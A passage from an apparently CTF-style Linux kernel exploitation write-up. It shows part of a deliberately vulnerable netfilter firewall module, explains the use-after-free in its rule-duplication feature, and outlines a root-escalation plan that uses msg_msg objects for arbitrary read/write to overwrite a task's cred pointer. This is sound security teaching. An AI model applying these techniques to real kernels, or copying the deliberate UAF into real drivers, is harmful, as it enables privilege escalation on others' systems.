        </tr>
        <tr>
          <td id="file-firewall-c-L445" class="blob-num js-line-number js-code-nav-line-number" data-line-number="445"></td>
          <td id="file-firewall-c-LC445" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (i = <span class="pl-c1">0</span>; i &lt; MAX_RULES; i++)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L446" class="blob-num js-line-number js-code-nav-line-number" data-line-number="446"></td>
          <td id="file-firewall-c-LC446" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L447" class="blob-num js-line-number js-code-nav-line-number" data-line-number="447"></td>
          <td id="file-firewall-c-LC447" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (firewall_rules_out[i])</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L448" class="blob-num js-line-number js-code-nav-line-number" data-line-number="448"></td>
          <td id="file-firewall-c-LC448" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L449" class="blob-num js-line-number js-code-nav-line-number" data-line-number="449"></td>
          <td id="file-firewall-c-LC449" class="blob-code blob-code-inner js-file-line">            ret = <span class="pl-c1">process_rule</span>(skb, firewall_rules_out[i], OUTBOUND, i);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L450" class="blob-num js-line-number js-code-nav-line-number" data-line-number="450"></td>
          <td id="file-firewall-c-LC450" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L451" class="blob-num js-line-number js-code-nav-line-number" data-line-number="451"></td>
          <td id="file-firewall-c-LC451" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> (ret != SKIP)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L452" class="blob-num js-line-number js-code-nav-line-number" data-line-number="452"></td>
          <td id="file-firewall-c-LC452" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">return</span> ret;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L453" class="blob-num js-line-number js-code-nav-line-number" data-line-number="453"></td>
          <td id="file-firewall-c-LC453" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L454" class="blob-num js-line-number js-code-nav-line-number" data-line-number="454"></td>
          <td id="file-firewall-c-LC454" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L455" class="blob-num js-line-number js-code-nav-line-number" data-line-number="455"></td>
          <td id="file-firewall-c-LC455" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L456" class="blob-num js-line-number js-code-nav-line-number" data-line-number="456"></td>
          <td id="file-firewall-c-LC456" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> NF_ACCEPT;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L457" class="blob-num js-line-number js-code-nav-line-number" data-line-number="457"></td>
          <td id="file-firewall-c-LC457" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L458" class="blob-num js-line-number js-code-nav-line-number" data-line-number="458"></td>
          <td id="file-firewall-c-LC458" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L459" class="blob-num js-line-number js-code-nav-line-number" data-line-number="459"></td>
          <td id="file-firewall-c-LC459" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L460" class="blob-num js-line-number js-code-nav-line-number" data-line-number="460"></td>
          <td id="file-firewall-c-LC460" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">int</span> <span class="pl-en">init_firewall</span>(<span class="pl-k">void</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L461" class="blob-num js-line-number js-code-nav-line-number" data-line-number="461"></td>
          <td id="file-firewall-c-LC461" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L462" class="blob-num js-line-number js-code-nav-line-number" data-line-number="462"></td>
          <td id="file-firewall-c-LC462" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">mutex_init</span>(&amp;firewall_lock);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L463" class="blob-num js-line-number js-code-nav-line-number" data-line-number="463"></td>
          <td id="file-firewall-c-LC463" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L464" class="blob-num js-line-number js-code-nav-line-number" data-line-number="464"></td>
          <td id="file-firewall-c-LC464" class="blob-code blob-code-inner js-file-line">    firewall_device.<span class="pl-smi">minor</span> = MISC_DYNAMIC_MINOR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L465" class="blob-num js-line-number js-code-nav-line-number" data-line-number="465"></td>
          <td id="file-firewall-c-LC465" class="blob-code blob-code-inner js-file-line">    firewall_device.<span class="pl-smi">name</span> = DEVICE_NAME;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L466" class="blob-num js-line-number js-code-nav-line-number" data-line-number="466"></td>
          <td id="file-firewall-c-LC466" class="blob-code blob-code-inner js-file-line">    firewall_device.<span class="pl-smi">fops</span> = &amp;firewall_fops;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L467" class="blob-num js-line-number js-code-nav-line-number" data-line-number="467"></td>
          <td id="file-firewall-c-LC467" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L468" class="blob-num js-line-number js-code-nav-line-number" data-line-number="468"></td>
          <td id="file-firewall-c-LC468" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">misc_register</span>(&amp;firewall_device))</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L469" class="blob-num js-line-number js-code-nav-line-number" data-line-number="469"></td>
          <td id="file-firewall-c-LC469" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L470" class="blob-num js-line-number js-code-nav-line-number" data-line-number="470"></td>
          <td id="file-firewall-c-LC470" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] Device registration failed!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L471" class="blob-num js-line-number js-code-nav-line-number" data-line-number="471"></td>
          <td id="file-firewall-c-LC471" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L472" class="blob-num js-line-number js-code-nav-line-number" data-line-number="472"></td>
          <td id="file-firewall-c-LC472" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L473" class="blob-num js-line-number js-code-nav-line-number" data-line-number="473"></td>
          <td id="file-firewall-c-LC473" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L474" class="blob-num js-line-number js-code-nav-line-number" data-line-number="474"></td>
          <td id="file-firewall-c-LC474" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Init] Initializing firewall...<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L475" class="blob-num js-line-number js-code-nav-line-number" data-line-number="475"></td>
          <td id="file-firewall-c-LC475" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L476" class="blob-num js-line-number js-code-nav-line-number" data-line-number="476"></td>
          <td id="file-firewall-c-LC476" class="blob-code blob-code-inner js-file-line">    firewall_rules_in = <span class="pl-c1">kzalloc</span>(<span class="pl-k">sizeof</span>(<span class="pl-k">void</span> *) * MAX_RULES, GFP_KERNEL);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L477" class="blob-num js-line-number js-code-nav-line-number" data-line-number="477"></td>
          <td id="file-firewall-c-LC477" class="blob-code blob-code-inner js-file-line">    firewall_rules_out = <span class="pl-c1">kzalloc</span>(<span class="pl-k">sizeof</span>(<span class="pl-k">void</span> *) * MAX_RULES, GFP_KERNEL);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L478" class="blob-num js-line-number js-code-nav-line-number" data-line-number="478"></td>
          <td id="file-firewall-c-LC478" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L479" class="blob-num js-line-number js-code-nav-line-number" data-line-number="479"></td>
          <td id="file-firewall-c-LC479" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">nf_register_net_hook</span>(&amp;init_net, &amp;in_hook) &lt; <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L480" class="blob-num js-line-number js-code-nav-line-number" data-line-number="480"></td>
          <td id="file-firewall-c-LC480" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L481" class="blob-num js-line-number js-code-nav-line-number" data-line-number="481"></td>
          <td id="file-firewall-c-LC481" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] Cannot register nf hook!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L482" class="blob-num js-line-number js-code-nav-line-number" data-line-number="482"></td>
          <td id="file-firewall-c-LC482" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L483" class="blob-num js-line-number js-code-nav-line-number" data-line-number="483"></td>
          <td id="file-firewall-c-LC483" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L484" class="blob-num js-line-number js-code-nav-line-number" data-line-number="484"></td>
          <td id="file-firewall-c-LC484" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L485" class="blob-num js-line-number js-code-nav-line-number" data-line-number="485"></td>
          <td id="file-firewall-c-LC485" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">nf_register_net_hook</span>(&amp;init_net, &amp;out_hook) &lt; <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L486" class="blob-num js-line-number js-code-nav-line-number" data-line-number="486"></td>
          <td id="file-firewall-c-LC486" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L487" class="blob-num js-line-number js-code-nav-line-number" data-line-number="487"></td>
          <td id="file-firewall-c-LC487" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] Cannot register nf hook!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L488" class="blob-num js-line-number js-code-nav-line-number" data-line-number="488"></td>
          <td id="file-firewall-c-LC488" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L489" class="blob-num js-line-number js-code-nav-line-number" data-line-number="489"></td>
          <td id="file-firewall-c-LC489" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L490" class="blob-num js-line-number js-code-nav-line-number" data-line-number="490"></td>
          <td id="file-firewall-c-LC490" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L491" class="blob-num js-line-number js-code-nav-line-number" data-line-number="491"></td>
          <td id="file-firewall-c-LC491" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Init] Firewall initialized!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L492" class="blob-num js-line-number js-code-nav-line-number" data-line-number="492"></td>
          <td id="file-firewall-c-LC492" class="blob-code blob-code-inner js-file-line">    #<span class="pl-k">ifdef</span> EASY_MODE</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L493" class="blob-num js-line-number js-code-nav-line-number" data-line-number="493"></td>
          <td id="file-firewall-c-LC493" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Init] 👼 Welcome to Easy Mode 👼<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L494" class="blob-num js-line-number js-code-nav-line-number" data-line-number="494"></td>
          <td id="file-firewall-c-LC494" class="blob-code blob-code-inner js-file-line">    #<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L495" class="blob-num js-line-number js-code-nav-line-number" data-line-number="495"></td>
          <td id="file-firewall-c-LC495" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Init] 😈 Welcome to Hard Mode 😈<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L496" class="blob-num js-line-number js-code-nav-line-number" data-line-number="496"></td>
          <td id="file-firewall-c-LC496" class="blob-code blob-code-inner js-file-line">    #<span class="pl-k">endif</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L497" class="blob-num js-line-number js-code-nav-line-number" data-line-number="497"></td>
          <td id="file-firewall-c-LC497" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> SUCCESS;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L498" class="blob-num js-line-number js-code-nav-line-number" data-line-number="498"></td>
          <td id="file-firewall-c-LC498" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L499" class="blob-num js-line-number js-code-nav-line-number" data-line-number="499"></td>
          <td id="file-firewall-c-LC499" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L500" class="blob-num js-line-number js-code-nav-line-number" data-line-number="500"></td>
          <td id="file-firewall-c-LC500" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L501" class="blob-num js-line-number js-code-nav-line-number" data-line-number="501"></td>
          <td id="file-firewall-c-LC501" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">void</span> <span class="pl-en">cleanup_firewall</span>(<span class="pl-k">void</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L502" class="blob-num js-line-number js-code-nav-line-number" data-line-number="502"></td>
          <td id="file-firewall-c-LC502" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L503" class="blob-num js-line-number js-code-nav-line-number" data-line-number="503"></td>
          <td id="file-firewall-c-LC503" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> i;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L504" class="blob-num js-line-number js-code-nav-line-number" data-line-number="504"></td>
          <td id="file-firewall-c-LC504" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L505" class="blob-num js-line-number js-code-nav-line-number" data-line-number="505"></td>
          <td id="file-firewall-c-LC505" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Exit] Cleaning up...<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L506" class="blob-num js-line-number js-code-nav-line-number" data-line-number="506"></td>
          <td id="file-firewall-c-LC506" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L507" class="blob-num js-line-number js-code-nav-line-number" data-line-number="507"></td>
          <td id="file-firewall-c-LC507" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (i = <span class="pl-c1">0</span>; i &lt; MAX_RULES; i++)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L508" class="blob-num js-line-number js-code-nav-line-number" data-line-number="508"></td>
          <td id="file-firewall-c-LC508" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L509" class="blob-num js-line-number js-code-nav-line-number" data-line-number="509"></td>
          <td id="file-firewall-c-LC509" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (firewall_rules_in[i] != <span class="pl-c1">NULL</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L510" class="blob-num js-line-number js-code-nav-line-number" data-line-number="510"></td>
          <td id="file-firewall-c-LC510" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L511" class="blob-num js-line-number js-code-nav-line-number" data-line-number="511"></td>
          <td id="file-firewall-c-LC511" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">kfree</span>(firewall_rules_in[i]);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L512" class="blob-num js-line-number js-code-nav-line-number" data-line-number="512"></td>
          <td id="file-firewall-c-LC512" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L513" class="blob-num js-line-number js-code-nav-line-number" data-line-number="513"></td>
          <td id="file-firewall-c-LC513" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L514" class="blob-num js-line-number js-code-nav-line-number" data-line-number="514"></td>
          <td id="file-firewall-c-LC514" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (firewall_rules_out[i] != <span class="pl-c1">NULL</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L515" class="blob-num js-line-number js-code-nav-line-number" data-line-number="515"></td>
          <td id="file-firewall-c-LC515" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L516" class="blob-num js-line-number js-code-nav-line-number" data-line-number="516"></td>
          <td id="file-firewall-c-LC516" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">kfree</span>(firewall_rules_out[i]);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L517" class="blob-num js-line-number js-code-nav-line-number" data-line-number="517"></td>
          <td id="file-firewall-c-LC517" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L518" class="blob-num js-line-number js-code-nav-line-number" data-line-number="518"></td>
          <td id="file-firewall-c-LC518" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L519" class="blob-num js-line-number js-code-nav-line-number" data-line-number="519"></td>
          <td id="file-firewall-c-LC519" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L520" class="blob-num js-line-number js-code-nav-line-number" data-line-number="520"></td>
          <td id="file-firewall-c-LC520" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(firewall_rules_in, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(<span class="pl-k">void</span> *) * MAX_RULES);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L521" class="blob-num js-line-number js-code-nav-line-number" data-line-number="521"></td>
          <td id="file-firewall-c-LC521" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(firewall_rules_out, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(<span class="pl-k">void</span> *) * MAX_RULES);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L522" class="blob-num js-line-number js-code-nav-line-number" data-line-number="522"></td>
          <td id="file-firewall-c-LC522" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L523" class="blob-num js-line-number js-code-nav-line-number" data-line-number="523"></td>
          <td id="file-firewall-c-LC523" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">kfree</span>(firewall_rules_in);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L524" class="blob-num js-line-number js-code-nav-line-number" data-line-number="524"></td>
          <td id="file-firewall-c-LC524" class="blob-code blob-code-inner js-file-line">    firewall_rules_in = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L525" class="blob-num js-line-number js-code-nav-line-number" data-line-number="525"></td>
          <td id="file-firewall-c-LC525" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L526" class="blob-num js-line-number js-code-nav-line-number" data-line-number="526"></td>
          <td id="file-firewall-c-LC526" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">kfree</span>(firewall_rules_out);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L527" class="blob-num js-line-number js-code-nav-line-number" data-line-number="527"></td>
          <td id="file-firewall-c-LC527" class="blob-code blob-code-inner js-file-line">    firewall_rules_out = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L528" class="blob-num js-line-number js-code-nav-line-number" data-line-number="528"></td>
          <td id="file-firewall-c-LC528" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L529" class="blob-num js-line-number js-code-nav-line-number" data-line-number="529"></td>
          <td id="file-firewall-c-LC529" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">nf_unregister_net_hook</span>(&amp;init_net, &amp;in_hook);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L530" class="blob-num js-line-number js-code-nav-line-number" data-line-number="530"></td>
          <td id="file-firewall-c-LC530" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">nf_unregister_net_hook</span>(&amp;init_net, &amp;out_hook);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L531" class="blob-num js-line-number js-code-nav-line-number" data-line-number="531"></td>
          <td id="file-firewall-c-LC531" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L532" class="blob-num js-line-number js-code-nav-line-number" data-line-number="532"></td>
          <td id="file-firewall-c-LC532" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">misc_deregister</span>(&amp;firewall_device);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L533" class="blob-num js-line-number js-code-nav-line-number" data-line-number="533"></td>
          <td id="file-firewall-c-LC533" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">mutex_destroy</span>(&amp;firewall_lock);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L534" class="blob-num js-line-number js-code-nav-line-number" data-line-number="534"></td>
          <td id="file-firewall-c-LC534" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L535" class="blob-num js-line-number js-code-nav-line-number" data-line-number="535"></td>
          <td id="file-firewall-c-LC535" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Exit] Cleanup done, bye!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L536" class="blob-num js-line-number js-code-nav-line-number" data-line-number="536"></td>
          <td id="file-firewall-c-LC536" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L537" class="blob-num js-line-number js-code-nav-line-number" data-line-number="537"></td>
          <td id="file-firewall-c-LC537" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L538" class="blob-num js-line-number js-code-nav-line-number" data-line-number="538"></td>
          <td id="file-firewall-c-LC538" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L539" class="blob-num js-line-number js-code-nav-line-number" data-line-number="539"></td>
          <td id="file-firewall-c-LC539" class="blob-code blob-code-inner js-file-line"><span class="pl-en">module_init</span>(init_firewall);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L540" class="blob-num js-line-number js-code-nav-line-number" data-line-number="540"></td>
          <td id="file-firewall-c-LC540" class="blob-code blob-code-inner js-file-line"><span class="pl-en">module_exit</span>(cleanup_firewall);</td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe/raw/22c9c8f0ec44a889d72d7a62674449085cfacdf6/firewall.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe#file-firewall-c">
          firewall.c
        </a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div><div><br></div><div>To summarize, a simple firewall driver was created, with a separate array for inbound rules and outbound rules (confined to ipv4). From userland, people can interact with the netfilter hooks via a misc device, using the user_rule_t struct, which gets transfered to the rule_t struct to go into the kmalloc-4k slab. Each rule is allocated in the array via kzalloc, and contains information about rule name, interface name, IP address, port, the action to take, the protocol (TCP or UDP), a duplication flag, and a large buffer for description which one cannot modify after allocating it. Most of these fields have validity checks (actions are only limited to DROP or ACCEPT), and add, edit, and delete rule are both safe. The only bug is in duplicate, which duplicates a rule from inbound to outbound or vice versa; an obvious UAF scenario occurs when you duplicate a rule from array 1 to array 2, and then delete it from one array without deleting it from the other.<br><br>Exploitation wise, there are a few serious roadblocks that would prevent common exploit paths and necessitate the need for good arb read and arb write primitivies. The fact that it is using the SLAB allocator means that no freelist pointer will be on the chunks themselves (and even if they were, they probably won't be within the 0x30 UAF region as the Linux kernel have moved them down for certain slabs). FG-KASLR will complicate the ability to overwrite function pointers (such as the one on the sk_buff struct's destructor arg callback in the CVE writeup), as most gadgets not in the earlier parts of .text will be affected; ROP is still possible, but I believe that would entail first arb reading the ksymtab for the function for whichever the gadget is relative to. Lastly, with <a href="https://elixir.bootlin.com/linux/v5.8/source/kernel/umh.c#L393">STATIC_USERMODE_HELPER</a> (and its path set to “”), the classic SMAP bypasses of targeting modprobe_path or core_pattern no longer work. The path itself is now located in a read only section of the kernel according to readelf. At this point, the most direct way to then bypass SMAP is to probably arb read the doubly linked list of task structures to find the current task, and overwrite the cred pointer to one that would give us root privileges. A physmap spray would be another common approach, but that's just painful.<br><br>Do note again that the vulnerability only gives a small window of UAF write, without UAF read. Once you allocate a few chunks to help smooth out the SLAB shuffling on the current slab, we can begin the exploitation procedure. Let's first take a detour into msg_msg (these <a href="https://man7.org/linux/man-pages/man2/msgop.2.html">manpages</a> can be quite helpful). I do consistently use the IPC_NOWAIT option to avoid hangs and a msgtyp of zero to pull from the front of the msg_queue. For reference, here is the <a href="https://elixir.bootlin.com/linux/v5.8/source/include/linux/msg.h#L9">msg_msg struct</a>:</div><div><br></div><div><script src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/cf23c13d4a1d345b557a157740e191fe.js(1).下載"></script><link rel="stylesheet" href="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist111465757" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-msg_msg_struct-h" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="msg_msg_struct.h">
        <tbody><tr>
          <td id="file-msg_msg_struct-h-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-msg_msg_struct-h-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">struct</span> msg_msg {</td>
        </tr>
        <tr>
          <td id="file-msg_msg_struct-h-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-msg_msg_struct-h-LC2" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> list_head m_list;</td>
        </tr>
        <tr>
          <td id="file-msg_msg_struct-h-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-msg_msg_struct-h-LC3" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">long</span> m_type;</td>
        </tr>
        <tr>
          <td id="file-msg_msg_struct-h-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-msg_msg_struct-h-LC4" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">size_t</span> m_ts;        <span class="pl-c"><span class="pl-c">/*</span> message text size <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-msg_msg_struct-h-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-msg_msg_struct-h-LC5" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> msg_msgseg *next;</td>
        </tr>
        <tr>
          <td id="file-msg_msg_struct-h-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-msg_msg_struct-h-LC6" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *security;</td>
        </tr>
        <tr>
          <td id="file-msg_msg_struct-h-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
